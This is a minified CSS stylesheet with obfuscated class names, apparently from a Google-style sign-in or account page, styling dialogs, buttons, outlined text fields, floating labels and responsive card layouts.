	border: 1px solid #c6c6c6;
	color: #333;
	-webkit-box-shadow: inset 0 1px 2px rgba(0, 0, 0, .1);
	box-shadow: inset 0 1px 2px rgba(0, 0, 0, .1)
}

.XKSfm-Sx9Kwc-c6xFrd button:focus {
	border: 1px solid #4d90fe
}

.XKSfm-Sx9Kwc-c6xFrd button[disabled] {
	-webkit-box-shadow: none;
	box-shadow: none;
	background: #fff;
	background-image: none;
	border: 1px solid #f3f3f3;
	border: 1px solid rgba(0, 0, 0, 0.05);
	color: #b8b8b8
}

.XKSfm-Sx9Kwc-c6xFrd .VIpgJd-ldDVFe-JIbuQc {
	background-color: #4d90fe;
	background-image: -webkit-linear-gradient(top, #4d90fe, #4787ed);
	background-image: linear-gradient(top, #4d90fe, #4787ed);
	border: 1px solid #3079ed;
	color: #fff
}

.XKSfm-Sx9Kwc-c6xFrd .VIpgJd-ldDVFe-JIbuQc:hover {
	background-color: #357ae8;
	background-image: -webkit-linear-gradient(top, #4d90fe, #357ae8);
	background-image: linear-gradient(top, #4d90fe, #357ae8);
	border: 1px solid #2f5bb7;
	color: #fff
}

.XKSfm-Sx9Kwc-c6xFrd .VIpgJd-ldDVFe-JIbuQc:active {
	background-color: #357ae8;
	background-image: -webkit-linear-gradient(top, #4d90fe, #357ae8);
	background-image: linear-gradient(top, #4d90fe, #357ae8);
	border: 1px solid #2f5bb7;
	color: #fff;
	-webkit-box-shadow: inset 0 1px 2px rgba(0, 0, 0, 0.3);
	box-shadow: inset 0 1px 2px rgba(0, 0, 0, 0.3)
}

.XKSfm-Sx9Kwc-c6xFrd .VIpgJd-ldDVFe-JIbuQc:focus {
	-webkit-box-shadow: inset 0 0 0 1px #fff;
	box-shadow: inset 0 0 0 1px #fff;
	border: 1px solid #fff;
	border: rgba(0, 0, 0, 0) solid 1px;
	outline: 1px solid #4d90fe;
	outline: rgba(0, 0, 0, 0) 0
}

.XKSfm-Sx9Kwc-c6xFrd .VIpgJd-ldDVFe-JIbuQc[disabled] {
	-webkit-box-shadow: none;
	box-shadow: none;
	background: #4d90fe;
	color: #fff;
	filter: alpha(opacity=50);
	opacity: .5
}

.qggrzb {
	background: #202124;
	left: 0;
	opacity: .6;
	pointer-events: auto;
	position: fixed;
	top: 0;
	z-index: 5
}

.afwRic .XKSfm-Sx9Kwc-bN97Pc,
.XKSfm-Sx9Kwc-bN97Pc * {
	outline: none
}

.fuqAvf {
	-webkit-box-sizing: border-box;
	box-sizing: border-box;
	overflow-y: auto;
	padding: 24px 24px 28px
}

.jveIPe:after {
	clear: both;
	content: '';
	display: table
}

.jveIPe .oG5Srb {
	background: #fff
}

html.KtJU1c,
.KtJU1c body {
	overflow: hidden;
	pointer-events: none
}

.XKSfm-Sx9Kwc {
	background-color: #fff;
	border: none;
	padding: 0;
	pointer-events: auto;
	z-index: 6
}

.XKSfm-Sx9Kwc-c6xFrd {
	margin-top: 0;
	padding: 0 16px 16px
}

.XKSfm-Sx9Kwc-bN97Pc {
	background: none
}

.XKSfm-Sx9Kwc-r4nke {
	background: none;
	font-size: 20px;
	font-weight: 500
}

.jveIPe .O0WRkf {
	-webkit-border-radius: 4px;
	border-radius: 4px;
	font-family: 'Google Sans', arial, sans-serif;
	font-size: 14px;
	line-height: inherit;
	text-transform: none
}

.jveIPe .O0WRkf .snByac {
	font-weight: 500
}

.jveIPe .oG5Srb {
	-webkit-box-shadow: none;
	box-shadow: none;
	color: #1a73e8
}

.jveIPe .oG5Srb:hover {
	background: rgba(60, 64, 67, 0.039)
}

.jveIPe .oG5Srb.u3bW4e {
	background: rgba(60, 64, 67, 0.122)
}

.QdxRZc .O0WRkf {
	min-width: inherit
}

.FKF6mc,
.FKF6mc:focus {
	display: block;
	outline: none;
	text-decoration: none
}

.FKF6mc:visited {
	fill: inherit;
	stroke: inherit
}

.U26fgb.u3bW4e {
	outline: 1px solid transparent
}

.C0oVfc {
	line-height: 20px;
	min-width: 88px
}

.C0oVfc .RveJvd {
	margin: 8px
}

.AU3ozd {
	position: relative;
	z-index: 100
}

.aCP0ld {
	color: #db4437;
	display: block;
	font-size: 12px;
	line-height: 16px;
	padding-right: 32px
}

.f1iPfc {
	outline: none;
	text-decoration: none
}

.f1iPfc:hover,
.f1iPfc:visited {
	color: inherit
}

.lUHSR {
	outline: none
}

html {
	-webkit-tap-highlight-color: rgba(0, 0, 0, 0);
	-webkit-tap-highlight-color: transparent
}

body {
	background: #fff;
	color: rgba(0, 0, 0, .87);
	direction: ltr;
	font-family: 'Roboto', sans-serif;
	font-size: 14px;
	line-height: 20px;
	margin: 0;
	padding: 0
}

@media all and (min-width:601px) {
	.uc81Ff {
		display: -webkit-box;
		display: -webkit-flex;
		display: flex;
		-webkit-flex-direction: column;
		flex-direction: column;
		min-height: 100vh;
		position: relative
	}
	.uc81Ff:before,
	.uc81Ff:after {
		-webkit-box-flex: 1;
		box-flex: 1;
		-webkit-flex-grow: 1;
		flex-grow: 1;
		content: '';
		display: block;
		height: 24px
	}
	.uc81Ff:before {
		min-height: 30px
	}
	.uc81Ff:after {
		min-height: 24px
	}
	.uc81Ff.wKBl8c:after {
		min-height: 64.8px
	}
}

h1 {
	font-size: 24px;
	font-weight: 400;
	line-height: 32px;
	margin: 0
}

h2 {
	font-size: 14px;
	font-weight: 500;
	line-height: 20px;
	margin-bottom: 0
}

h3 {
	font-size: 16px;
	font-weight: 500;
	line-height: 20px
}

a,
a:hover,
a:visited,
a[href].uBOgn,
button[type=button].uBOgn {
	color: #1a73e8;
	cursor: pointer;
	font-weight: 500;
	text-decoration: none;
	outline: none
}

a[href].uBOgn,
button[type=button].uBOgn {
	background: none;
	border: none;
	display: inline-block;
	font-family: inherit;
	font-size: inherit;
	line-height: inherit;
	margin: 0;
	padding: 0;
	position: relative;
	white-space: nowrap
}

a[href].uBOgn::-moz-focus-inner {
	border: 0
}

button[type=button].uBOgn::-moz-focus-inner {
	border: 0
}

a[href].uBOgn:after,
button[type=button].uBOgn:after {
	background: rgba(66, 133, 244, .26);
	-webkit-border-radius: 2px;
	border-radius: 2px;
	bottom: -2px;
	content: '';
	left: -3px;
	opacity: 0;
	position: absolute;
	right: -3px;
	top: -2px;
	-webkit-transition: opacity .2s;
	transition: opacity .2s;
	z-index: -1
}

a[href].uBOgn:focus:after,
button[type=button].uBOgn:focus:after {
	opacity: 1
}

.LJtPoc {
	display: -webkit-box;
	display: -webkit-flex;
	display: flex;
	-webkit-flex-direction: column;
	flex-direction: column;
	background: #fff;
	-webkit-box-sizing: border-box;
	box-sizing: border-box;
	max-width: 100%;
	position: relative;
	z-index: 2
}

.wKBl8c .LJtPoc {
	min-height: 100vh
}

@media all and (min-width:601px) {
	.wKBl8c .LJtPoc {
		min-height: 0
	}
	.LJtPoc,
	.bdf4dc {
		-webkit-transition: .2s;
		transition: .2s
	}
	.LJtPoc {
		-webkit-flex-shrink: 0;
		flex-shrink: 0;
		background: #fff;
		border: 1px solid #dadce0;
		-webkit-border-radius: 8px;
		border-radius: 8px;
		display: block;
		margin: 0 auto;
		min-height: 0;
		width: 450px
	}
	.LJtPoc.qmmlRd {
		width: 450px
	}
}

@media all and (min-width:901px) {
	.RELBvb .LJtPoc {
		width: 750px
	}
}

@media all and (min-width:601px) {
	.qmmlRd .bdf4dc {
		height: auto;
		min-height: 500px
	}
}

@media all and (min-width:601px) and (orientation:landscape) {
	.uc81Ff:not(.RELBvb) .LJtPoc.v7usYb {
		width: 450px
	}
	.v7usYb .bdf4dc {
		height: auto;
		min-height: 500px
	}
}

.LJtPoc .c8DD0,
.LJtPoc .IdAqtf {
	position: fixed
}

@media all and (min-width:601px) {
	.LJtPoc .c8DD0,
	.LJtPoc .IdAqtf {
		position: absolute
	}
}

.c8DD0 {
	z-index: 5
}

.IdAqtf {
	z-index: 4
}

.bdf4dc {
	-webkit-box-flex: 1;
	box-flex: 1;
	-webkit-flex-grow: 1;
	flex-grow: 1;
	-webkit-box-sizing: border-box;
	box-sizing: border-box;
	overflow: hidden;
	padding: 24px 24px 36px
}

.bdf4dc.nnGvjf {
	overflow: visible;
	position: relative;
	z-index: 1
}

.nnGvjf .RFjuSb {
	overflow: visible
}

.nnGvjf .mbekbe,
.nnGvjf .iUe6Pd {
	-webkit-transform: none;
	transform: none
}

@media all and (min-width:450px) {
	.bdf4dc {
		padding: 48px 40px 36px
	}
}

@media all and (min-width:601px) {
	.bdf4dc {
		height: auto;
		min-height: 500px;
		overflow-y: auto
	}
}

@media all and (min-width:901px) {
	.RELBvb .bdf4dc {
		display: -webkit-box;
		display: -webkit-flex;
		display: flex
	}
	.RELBvb .slptg {
		-webkit-flex-basis: 450px;
		flex-basis: 450px;
		margin: 0 -48px;
		overflow: hidden;
		padding: 0 48px
	}
}

.zj4yYb {
	display: none
}

@media all and (min-width:901px) {
	.zj4yYb {
		display: -webkit-box;
		display: -webkit-flex;
		display: flex;
		-webkit-flex-shrink: 0;
		flex-shrink: 0;
		-webkit-box-sizing: border-box;
		box-sizing: border-box;
		padding-left: 48px;
		width: 300px
	}
}

.bxPAYd {
	margin: auto -24px
}

@media all and (min-width:450px) {
	.bxPAYd {
		margin: auto -40px
	}
}

.k6Zj8d {
	padding-left: 24px;
	padding-right: 24px
}

@media all and (min-width:450px) {
	.k6Zj8d {
		padding-left: 40px;
		padding-right: 40px
	}
}

.Us7fWe {
	border: 0 solid transparent;
	border-width: 0 24px;
	-webkit-box-sizing: border-box;
	box-sizing: border-box
}

@media all and (min-width:450px) {
	.Us7fWe {
		border-left-width: 40px;
		border-right-width: 40px
	}
}

.VYMape {
	background: #fff;
	bottom: 0;
	direction: ltr;
	left: 0;
	overflow: hidden;
	position: absolute;
	right: 0;
	top: 0;
	z-index: 1
}

.VYMape svg {
	display: none;
	height: 100%;
	position: relative;
	width: 100%
}

@media all and (min-width:601px) {
	.VYMape svg {
		display: block
	}
}

.RRP0oc {
	direction: ltr;
	text-align: left
}

.fyYaqe {
	white-space: nowrap
}

.jMMxC {
	color: #db4437
}

@media all and (min-width:450px) {
	.qyP4Xe {
		width: 450px
	}
}

.uc81Ff~.nY5oDd,
.uc81Ff~.nY5oDd .jveIPe {
	display: -webkit-box;
	display: -webkit-flex;
	display: flex;
	-webkit-flex-direction: column;
	flex-direction: column
}

.uc81Ff~.nY5oDd {
	-webkit-border-radius: 2px;
	border-radius: 2px;
	color: #757575;
	font-size: 14px;
	left: 50%;
	line-height: 1.5;
	max-height: 90vh;
	max-width: 90vw;
	overflow-y: auto;
	position: fixed;
	top: 50%;
	-webkit-transform: translate(-50%, -50%);
	transform: translate(-50%, -50%);
	width: 280px
}

@media all and (min-width:901px) {
	.uc81Ff.RELBvb~.nY5oDd {
		width: 580px
	}
}

@media all and (min-height:270px) {
	.uc81Ff~.nY5oDd {
		min-height: 240px;
		overflow-y: visible
	}
	.uc81Ff~.nY5oDd.fh9DEc {
		overflow-y: auto
	}
}

.uc81Ff~.nY5oDd.nDmuSb {
	width: auto
}

.uc81Ff~.nY5oDd .fuqAvf {
	-webkit-box-flex: 1;
	box-flex: 1;
	-webkit-flex-grow: 1;
	flex-grow: 1;
	overflow-y: visible;
	padding: 24px 24px 12px
}

@media all and (min-height:270px) {
	.uc81Ff~.nY5oDd .fuqAvf {
		overflow-y: auto
	}
	.uc81Ff~.nY5oDd.fh9DEc .fuqAvf {
		overflow-y: visible
	}
}

.uc81Ff~.nY5oDd .jE5rrf {
	color: #202124;
	font-size: 16px;
	font-weight: 500;
	margin-bottom: 24px
}

.uc81Ff~.nY5oDd .z2Z95 {
	color: #f44336
}

.uc81Ff~.nY5oDd .jE5rrf:empty {
	margin: 0
}

.uc81Ff~.nY5oDd .jE5rrf:empty~.RUor5 {
	font-size: 16px
}

.uc81Ff~.nY5oDd .RUor5>:first-child {
	margin-top: 0
}

.uc81Ff~.nY5oDd .RUor5>:last-child {
	margin-bottom: 0
}

.uc81Ff~.nY5oDd .jveIPe {
	-webkit-align-items: flex-end;
	align-items: flex-end;
	-webkit-flex-shrink: 0;
	flex-shrink: 0;
	padding: 4px 16px;
	text-align: right
}

.uc81Ff~.nY5oDd.nDmuSb .jveIPe {
	background: #fafafa;
	display: block;
	padding-bottom: 0;
	position: relative
}

.uc81Ff~.nY5oDd .x81T2e {
	-webkit-border-radius: 2px;
	border-radius: 2px;
	padding: 12px
}

.uc81Ff~.nY5oDd .x81T2e:focus {
	background-color: rgba(0, 0, 0, 0.12)
}

.uc81Ff~.qggrzb {
	bottom: 0;
	left: 0;
	position: fixed;
	right: 0;
	top: 0
}

.WICB4e {
	font-size: 14px;
	margin-top: 40px;
	margin-bottom: 0;
	color: #757575
}

.Zp5qWd {
	font-family: 'Google Sans', arial, sans-serif;
	font-weight: 500;
	letter-spacing: .25px
}

.Zp5qWd.u3bW4e {
	-webkit-box-shadow: 0 6px 10px 0 rgba(0, 0, 0, 0.14), 0 1px 18px 0 rgba(0, 0, 0, 0.12), 0 3px 5px -1px rgba(0, 0, 0, 0.2);
	box-shadow: 0 6px 10px 0 rgba(0, 0, 0, 0.14), 0 1px 18px 0 rgba(0, 0, 0, 0.12), 0 3px 5px -1px rgba(0, 0, 0, 0.2)
}

.Zp5qWd.O0WRkf {
	-webkit-border-radius: 4px;
	border-radius: 4px;
	text-transform: none
}

.Zp5qWd.zZhnYe {
	-webkit-box-shadow: none;
	box-shadow: none
}

.Zp5qWd.zZhnYe:not(.RDPZE) {
	background: #1a73e8
}

.Zp5qWd:hover.zZhnYe:not(.RDPZE) {
	background: #1a65c8;
	-webkit-box-shadow: 0 1px 1px 0 rgba(66, 133, 244, 0.45), 0 1px 3px 1px rgba(66, 133, 244, 0.3);
	box-shadow: 0 1px 1px 0 rgba(66, 133, 244, 0.45), 0 1px 3px 1px rgba(66, 133, 244, 0.3)
}

.Zp5qWd.qs41qe.zZhnYe:not(.RDPZE),
.Zp5qWd.u3bW4e.zZhnYe:not(.RDPZE) {
	background: #1a5fb8;
	-webkit-box-shadow: 0 1px 1px 0 rgba(66, 133, 244, 0.3), 0 1px 3px 1px rgba(66, 133, 244, 0.15);
	box-shadow: 0 1px 1px 0 rgba(66, 133, 244, 0.3), 0 1px 3px 1px rgba(66, 133, 244, 0.15)
}

.Zp5qWd.oG5Srb {
	-webkit-box-shadow: none;
	box-shadow: none;
	color: #1a73e8
}

.Zp5qWd:hover.oG5Srb:not(.RDPZE) {
	background: #f6fafe
}

.Zp5qWd.u3bW4e.oG5Srb:not(.RDPZE) {
	background: #e8f0fd
}

.IMH1vc {
	color: #1a73e8;
	cursor: pointer;
	display: inline-block;
	font-family: 'Google Sans', arial, sans-serif;
	font-weight: 500;
	letter-spacing: .25px;
	line-height: 36px;
	padding: 6px 0;
	position: relative
}

.IMH1vc:before {
	background: rgba(66, 133, 244, .26);
	-webkit-border-radius: 2px;
	border-radius: 2px;
	bottom: 6px;
	content: '';
	left: -16px;
	opacity: 0;
	position: absolute;
	right: -16px;
	top: 6px;
	-webkit-transition: opacity .2s;
	transition: opacity .2s;
	z-index: -1
}

.IMH1vc:hover:before {
	background: #f6fafe;
	opacity: 1
}

.IMH1vc:focus:before {
	background: #e8f0fd;
	opacity: 1
}

.jyHEHd {
	display: none
}

.Qnrcxb {
	background: transparent;
	bottom: 0;
	display: none;
	left: 0;
	position: fixed;
	right: 0;
	top: 0;
	z-index: 1
}

.Pwyhu {
	margin-top: 26px
}

.YY0nEe {
	display: none
}

.XmqXzd {
	height: 18px;
	margin-left: 6px;
	width: 18px
}

.rFrNMe {
	-webkit-user-select: none;
	-webkit-tap-highlight-color: transparent;
	display: inline-block;
	outline: none;
	padding-bottom: 8px;
	width: 200px
}

.aCsJod {
	height: 40px;
	position: relative;
	vertical-align: top
}

.aXBtI {
	display: -webkit-box;
	display: -webkit-flex;
	display: flex;
	position: relative;
	top: 14px
}

.Xb9hP {
	display: -webkit-box;
	display: -webkit-flex;
	display: flex;
	-webkit-box-flex: 1;
	box-flex: 1;
	-webkit-flex-grow: 1;
	flex-grow: 1;
	-webkit-flex-shrink: 1;
	flex-shrink: 1;
	min-width: 0%;
	position: relative
}

.A37UZe {
	-webkit-box-sizing: border-box;
	box-sizing: border-box;
	height: 24px;
	line-height: 24px;
	position: relative
}

.qgcB3c:not(:empty) {
	padding-right: 12px
}

.sxyYjd:not(:empty) {
	padding-left: 12px
}

.whsOnd {
	-webkit-box-flex: 1;
	box-flex: 1;
	-webkit-flex-grow: 1;
	flex-grow: 1;
	-webkit-flex-shrink: 1;
	flex-shrink: 1;
	background-color: transparent;
	border: none;
	display: block;
	font: 400 16px Roboto, RobotoDraft, Helvetica, Arial, sans-serif;
	height: 24px;
	line-height: 24px;
	margin: 0;
	min-width: 0%;
	outline: none;
	padding: 0;
	z-index: 0
}

.rFrNMe.dm7YTc .whsOnd {
	color: #fff
}

.whsOnd:invalid,
.whsOnd:-moz-submit-invalid,
.whsOnd:-moz-ui-invalid {
	-webkit-box-shadow: none;
	box-shadow: none
}

.I0VJ4d>.whsOnd::-ms-clear,
.I0VJ4d>.whsOnd::-ms-reveal {
	display: none
}

.i9lrp {
	background-color: rgba(0, 0, 0, 0.12);
	bottom: -2px;
	height: 1px;
	left: 0;
	margin: 0;
	padding: 0;
	position: absolute;
	width: 100%
}

.i9lrp:before {
	content: "";
	position: absolute;
	top: 0;
	bottom: -2px;
	left: 0;
	right: 0;
	border-bottom: 1px solid rgba(0, 0, 0, 0);
	pointer-events: none
}

.rFrNMe.dm7YTc .i9lrp {
	background-color: rgba(255, 255, 255, 0.70)
}

.OabDMe {
	-webkit-transform: scaleX(0);
	transform: scaleX(0);
	background-color: #4285f4;
	bottom: -2px;
	height: 2px;
	left: 0;
	margin: 0;
	padding: 0;
	position: absolute;
	width: 100%
}

.rFrNMe.dm7YTc .OabDMe {
	background-color: #a1c2fa
}

.rFrNMe.k0tWj .i9lrp,
.rFrNMe.k0tWj .OabDMe {
	background-color: #d50000;
	height: 2px
}

.rFrNMe.k0tWj.dm7YTc .i9lrp,
.rFrNMe.k0tWj.dm7YTc .OabDMe {
	background-color: #e06055
}

.whsOnd[disabled] {
	color: rgba(0, 0, 0, 0.38)
}

.rFrNMe.dm7YTc .whsOnd[disabled] {
	color: rgba(255, 255, 255, 0.50)
}

.whsOnd[disabled]~.i9lrp {
	background: none;
	border-bottom: 1px dotted rgba(0, 0, 0, 0.38)
}

.OabDMe.Y2Zypf {
	-webkit-animation: quantumWizPaperInputRemoveUnderline .3s cubic-bezier(0.4, 0, 0.2, 1);
	animation: quantumWizPaperInputRemoveUnderline .3s cubic-bezier(0.4, 0, 0.2, 1)
}

.rFrNMe.u3bW4e .OabDMe {
	-webkit-animation: quantumWizPaperInputAddUnderline .3s cubic-bezier(0.4, 0, 0.2, 1);
	animation: quantumWizPaperInputAddUnderline .3s cubic-bezier(0.4, 0, 0.2, 1);
	-webkit-transform: scaleX(1);
	transform: scaleX(1)
}

.rFrNMe.sdJrJc>.aCsJod {
	padding-top: 24px
}

.AxOyFc {
	-webkit-transform-origin: bottom left;
	transform-origin: bottom left;
	-webkit-transition: all .3s cubic-bezier(0.4, 0, 0.2, 1);
	transition: all .3s cubic-bezier(0.4, 0, 0.2, 1);
	-webkit-transition-property: color, bottom, transform;
	transition-property: color, bottom, transform;
	color: rgba(0, 0, 0, 0.38);
	font: 400 16px Roboto, RobotoDraft, Helvetica, Arial, sans-serif;
	font-size: 16px;
	pointer-events: none;
	position: absolute;
	bottom: 3px;
	left: 0;
	width: 100%
}

.whsOnd:not([disabled]):focus~.AxOyFc,
.whsOnd[badinput="true"]~.AxOyFc,
.rFrNMe.CDELXb .AxOyFc,
.rFrNMe.dLgj8b .AxOyFc {
	-webkit-transform: scale(.75) translateY(-39px);
	transform: scale(.75) translateY(-39px)
}

.whsOnd:not([disabled]):focus~.AxOyFc {
	color: #4285f4
}

.rFrNMe.dm7YTc .whsOnd:not([disabled]):focus~.AxOyFc {
	color: #a1c2fa
}

.rFrNMe.k0tWj .whsOnd:not([disabled]):focus~.AxOyFc {
	color: #d50000
}

.ndJi5d {
	color: rgba(0, 0, 0, 0.38);
	font: 400 16px Roboto, RobotoDraft, Helvetica, Arial, sans-serif;
	max-width: 100%;
	overflow: hidden;
	pointer-events: none;
	position: absolute;
	text-overflow: ellipsis;
	top: 2px;
	left: 0;
	white-space: nowrap
}

.rFrNMe.CDELXb .ndJi5d {
	display: none
}

.K0Y8Se {
	-webkit-tap-highlight-color: transparent;
	font: 400 12px Roboto, RobotoDraft, Helvetica, Arial, sans-serif;
	height: 16px;
	margin-left: auto;
	padding-left: 16px;
	padding-top: 8px;
	pointer-events: none;
	opacity: .3;
	white-space: nowrap
}

.rFrNMe.dm7YTc .AxOyFc,
.rFrNMe.dm7YTc .K0Y8Se,
.rFrNMe.dm7YTc .ndJi5d {
	color: rgba(255, 255, 255, 0.70)
}

.rFrNMe.Tyc9J {
	padding-bottom: 4px
}

.dEOOab,
.ovnfwe:not(:empty) {
	-webkit-tap-highlight-color: transparent;
	-webkit-flex: 1 1 auto;
	flex: 1 1 auto;
	font: 400 12px Roboto, RobotoDraft, Helvetica, Arial, sans-serif;
	min-height: 16px;
	padding-top: 8px
}

.LXRPh {
	display: -webkit-box;
	display: -webkit-flex;
	display: flex
}

.ovnfwe {
	pointer-events: none
}

.dEOOab {
	color: #d50000
}

.rFrNMe.dm7YTc .dEOOab,
.rFrNMe.dm7YTc.k0tWj .whsOnd:not([disabled]):focus~.AxOyFc {
	color: #e06055
}

.ovnfwe {
	opacity: .3
}

.rFrNMe.dm7YTc .ovnfwe {
	color: rgba(255, 255, 255, 0.70);
	opacity: 1
}

.rFrNMe.k0tWj .ovnfwe,
.rFrNMe:not(.k0tWj) .ovnfwe:not(:empty)+.dEOOab {
	display: none
}

@keyframes quantumWizPaperInputRemoveUnderline {
	0% {
		-webkit-transform: scaleX(1);
		transform: scaleX(1);
		opacity: 1
	}
	to {
		-webkit-transform: scaleX(1);
		transform: scaleX(1);
		opacity: 0
	}
}

@-webkit-keyframes quantumWizPaperInputRemoveUnderline {
	0% {
		-webkit-transform: scaleX(1);
		transform: scaleX(1);
		opacity: 1
	}
	to {
		-webkit-transform: scaleX(1);
		transform: scaleX(1);
		opacity: 0
	}
}

@keyframes quantumWizPaperInputAddUnderline {
	0% {
		-webkit-transform: scaleX(0);
		transform: scaleX(0)
	}
	to {
		-webkit-transform: scaleX(1);
		transform: scaleX(1)
	}
}

@-webkit-keyframes quantumWizPaperInputAddUnderline {
	0% {
		-webkit-transform: scaleX(0);
		transform: scaleX(0)
	}
	to {
		-webkit-transform: scaleX(1);
		transform: scaleX(1)
	}
}

.fQxwff.fQxwff {
	-webkit-box-sizing: content-box;
	box-sizing: content-box
}

.fQxwff .rFrNMe.uIZQNc {
	padding: 16px 0 8px
}

.fQxwff.OcVpRe .uIZQNc {
	padding: 24px 0 8px
}

.fQxwff:first-child .uIZQNc {
	padding: 8px 0 8px
}

.uIZQNc {
	width: 100%
}

.rFrNMe.uIZQNc .oJeWuf.oJeWuf {
	height: 56px;
	padding-top: 0
}

.OcVpRe .rFrNMe.uIZQNc .oJeWuf.oJeWuf {
	height: 36px
}

.uIZQNc .snByac {
	background: #fff;
	bottom: 17px;
	-webkit-box-sizing: border-box;
	box-sizing: border-box;
	color: #80868b;
	font-size: 16px;
	font-weight: 400;
	left: 8px;
	padding: 0 8px;
	-webkit-transition: transform 150ms cubic-bezier(0.4, 0, 0.2, 1), opacity 150ms cubic-bezier(0.4, 0, 0.2, 1);
	transition: transform 150ms cubic-bezier(0.4, 0, 0.2, 1), opacity 150ms cubic-bezier(0.4, 0, 0.2, 1);
	width: auto;
	z-index: 1
}

.OcVpRe .uIZQNc .snByac {
	bottom: 9px;
	color: #5f6368;
	font-size: 14px;
	left: 6px;
	padding: 0 6px
}

.OcVpRe .uIZQNc.u3bW4e .snByac,
.OcVpRe .uIZQNc.CDELXb .snByac {
	-webkit-transform: scale(.75) translateY(-155%);
	transform: scale(.75) translateY(-155%)
}

.uIZQNc.u3bW4e .snByac.AxOyFc {
	color: #1a73e8
}

.uIZQNc.u3bW4e.IYewr .zHQkBf:not([disabled])~.snByac.AxOyFc {
	color: #d93025
}

.uIZQNc .ndJi5d {
	top: inherit
}

.uIZQNc .Is7Fhb {
	opacity: 1;
	padding-top: 8px
}

.uIZQNc .Wic03c {
	-webkit-align-items: center;
	align-items: center;
	position: static;
	top: 0
}

.uIZQNc .iHd5yb {
	padding-left: 15px
}

.uIZQNc.u3bW4e .iHd5yb {
	padding-left: 14px;
	z-index: 1
}

.OcVpRe .uIZQNc .iHd5yb {
	padding-left: 11px
}

.OcVpRe .uIZQNc.u3bW4e .iHd5yb {
	padding-left: 10px
}

.uIZQNc .MQL3Ob {
	padding-left: 6px;
	padding-right: 15px
}

.uIZQNc.u3bW4e .MQL3Ob {
	padding-right: 14px
}

.OcVpRe .uIZQNc .MQL3Ob {
	padding-right: 11px
}

.OcVpRe .uIZQNc.u3bW4e .MQL3Ob {
	padding-right: 10px
}

.KKdlBd.CDELXb.YuII8b .MQL3Ob {
	opacity: 0
}

.uIZQNc .zHQkBf {
	-webkit-border-radius: 4px;
	border-radius: 4px;
	font-size: 16px;
	font-weight: 400;
	height: 28px;
	margin: 1px 1px 0 1px;
	padding: 13px 15px;
	z-index: 1
}

.uIZQNc.u3bW4e .zHQkBf,
.uIZQNc.k0tWj .zHQkBf {
	margin: 2px 2px 0 2px;
	padding: 12px 14px
}

.OcVpRe .uIZQNc .zHQkBf {
	font-size: 14px;
	height: 20px;
	padding: 7px 11px
}

.OcVpRe .uIZQNc.u3bW4e .zHQkBf,
.OcVpRe .uIZQNc.k0tWj .zHQkBf {
	height: 20px;
	padding: 6px 10px
}

.og3oZc .zHQkBf,
.og3oZc .MQL3Ob {
	direction: ltr;
	text-align: left
}

.KKdlBd .zHQkBf {
	text-align: left
}

.fRpVEf {
	color: #202124;
	direction: ltr;
	display: inline-block
}

.uIZQNc .RxsGPe:empty {
	-webkit-flex: none;
	flex: none;
	min-height: 0;
	padding-top: 0
}

.uIZQNc .mIZh1c {
	border: 1px solid #dadce0;
	-webkit-border-radius: 4px;
	border-radius: 4px;
	bottom: 0;
	-webkit-box-sizing: border-box;
	box-sizing: border-box
}

.uIZQNc .cXrdqd {
	-webkit-border-radius: 4px;
	border-radius: 4px;
	bottom: 0;
	opacity: 0;
	-webkit-transform: none;
	transform: none;
	-webkit-transition: opacity 150ms cubic-bezier(0.4, 0, 0.2, 1);
	transition: opacity 150ms cubic-bezier(0.4, 0, 0.2, 1);
	width: -webkit-calc(100% - 2*2px);
	width: calc(100% - 2*2px)
}

.uIZQNc .mIZh1c,
.uIZQNc .cXrdqd,
.uIZQNc.k0tWj .mIZh1c,
.uIZQNc.k0tWj .cXrdqd {
	background-color: transparent
}

.uIZQNc .mIZh1c,
.uIZQNc.k0tWj .mIZh1c {
	height: 100%
}

.uIZQNc .cXrdqd,
.uIZQNc.k0tWj .cXrdqd {
	height: -webkit-calc(100% - 2*2px);
	height: calc(100% - 2*2px)
}

.uIZQNc.u3bW4e .cXrdqd,
.uIZQNc.k0tWj .cXrdqd {
	-webkit-animation: none;
	animation: none;
	opacity: 1
}

.uIZQNc.u3bW4e .cXrdqd {
	border: 2px solid #1a73e8
}

.uIZQNc.k0tWj .cXrdqd {
	border: 2px solid #d93025
}

@media all and (min-width:601px) {
	.Xk3mYe.DbQnIe .SHLEbf {
		display: -webkit-box;
		display: -webkit-flex;
		display: flex;
		-webkit-justify-content: space-between;
		justify-content: space-between;
		margin-left: -12px;
		margin-right: -12px
	}
}

@media all and (min-width:601px) {
	.Xk3mYe.DbQnIe .HHWSud {
		-webkit-box-flex: 1;
		box-flex: 1;
		-webkit-flex-grow: 1;
		flex-grow: 1;
		margin-left: 12px;
		margin-right: 12px
	}
}

.A3sRAb.A3sRAb {
	-webkit-box-sizing: content-box;
	box-sizing: content-box
}

.A3sRAb {
	width: 100%
}

.A3sRAb .oJeWuf.oJeWuf {
	height: 56px;
	padding-top: 16px
}

.A3sRAb.OcVpRe .oJeWuf.oJeWuf {
	height: 36px
}

.A3sRAb .Wic03c {
	-webkit-align-items: center;
	align-items: center;
	position: static
}

.A3sRAb .snByac {
	background-color: transparent;
	bottom: 18px;
	-webkit-box-sizing: border-box;
	box-sizing: border-box;
	color: #80868b;
	font-size: 16px;
	font-weight: 400;
	left: 8px;
	max-width: -webkit-calc(100% - (2*8px));
	max-width: calc(100% - (2*8px));
	overflow: hidden;
	padding: 0 8px;
	text-overflow: ellipsis;
	-webkit-transition: transform .15s cubic-bezier(.4, 0, .2, 1), opacity .15s cubic-bezier(.4, 0, .2, 1), background-color .15s cubic-bezier(.4, 0, .2, 1);
	transition: transform .15s cubic-bezier(.4, 0, .2, 1), opacity .15s cubic-bezier(.4, 0, .2, 1), background-color .15s cubic-bezier(.4, 0, .2, 1);
	white-space: nowrap;
	width: auto;
	z-index: 1
}

.A3sRAb.OcVpRe .snByac {
	bottom: 10px;
	color: #5f6368;
	font-size: 14px;
	left: 6px;
	padding: 0 6px
}

.A3sRAb.u3bW4e .snByac.snByac,
.A3sRAb.CDELXb .snByac.snByac {
	background-color: #fff;
	-webkit-transform: scale(.75) translatey(-41px);
	transform: scale(.75) translatey(-41px)
}

.A3sRAb.OcVpRe.u3bW4e .snByac,
.A3sRAb.OcVpRe.CDELXb .snByac {
	-webkit-transform: scale(.75) translatey(-165%);
	transform: scale(.75) translatey(-165%)
}

.A3sRAb .zHQkBf:not([disabled]):focus~.snByac {
	color: #1a73e8
}

.A3sRAb.IYewr.u3bW4e .zHQkBf:not([disabled])~.snByac,
.A3sRAb.IYewr.CDELXb .zHQkBf:not([disabled])~.snByac {
	color: #d93025
}

